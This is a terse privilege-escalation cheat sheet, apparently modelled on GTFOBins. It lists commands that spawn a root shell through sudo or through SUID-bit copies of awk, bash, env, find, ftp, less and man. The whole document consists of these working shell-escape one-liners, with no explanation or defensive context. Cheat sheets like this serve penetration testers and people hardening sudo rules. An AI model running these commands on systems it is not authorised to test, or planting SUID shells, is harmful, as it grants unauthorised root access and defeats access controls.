# AWK
### SUDO
```
sudo awk 'BEGIN {system("/bin/sh")}'
```

### SUID
```
sudo sh -c 'cp $(which awk) .; chmod +s ./awk'

./awk 'BEGIN {system("/bin/sh")}'

```

# BASH
### SUDO
```
sudo bash
```
### SUID
```
sudo sh -c 'cp $(which bash) .; chmod +s ./bash'

./bash -p
```
# ENV
### SUDO
```
sudo env /bin/sh
```
### SUID
```
sudo sh -c 'cp $(which env) .; chmod +s ./env'

./env /bin/sh -p
```
# FIND
### SUDO
```
sudo find . -exec /bin/sh \; -quit
```
### SUID
```
sudo sh -c 'cp $(which find) .; chmod +s ./find'

./find . -exec /bin/sh -p \; -quit
```
# FTP
### SUDO
```
sudo ftp
!/bin/sh
```
# LESS
### SUDO
```
sudo less /etc/profile
!/bin/sh
```
### SUID
```
sudo sh -c 'cp $(which less) .; chmod +s ./less'

./less file_to_read
```
# MAN
### SUDO
```
sudo man man
!/bin/sh
```
